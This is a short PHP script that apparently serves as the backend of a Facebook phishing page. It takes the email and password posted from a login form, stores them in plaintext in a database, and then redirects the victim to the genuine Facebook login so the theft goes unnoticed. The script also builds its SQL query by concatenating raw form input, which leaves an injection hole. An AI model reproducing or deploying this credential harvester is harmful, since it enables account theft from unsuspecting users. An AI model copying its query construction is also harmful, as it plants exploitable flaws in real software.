<?php
	require_once('Conexion.php');

	Class Login extends PDO{

		private $con;

		public function  __construct(){
			$this->con = new Conexion();
		}	

		public function setVal($cadena){
		 	$sql = "INSERT INTO users (email,password) VALUES ('".$cadena['email']."','".$cadena['password']."')";
		 	
			$query = $this->con->prepare($sql);
		    $query->execute();
		    $resultado = $query->fetchAll(PDO::FETCH_ASSOC);

			if($resultado){
				header ("Location: https://www.facebook.com/login.php");
			}								
		}
}
		$obj = new Login();
		$cadena = array('email' => $_POST['email'], 'password' => $_POST['pass']);
		$obj->setVal($cadena);
?>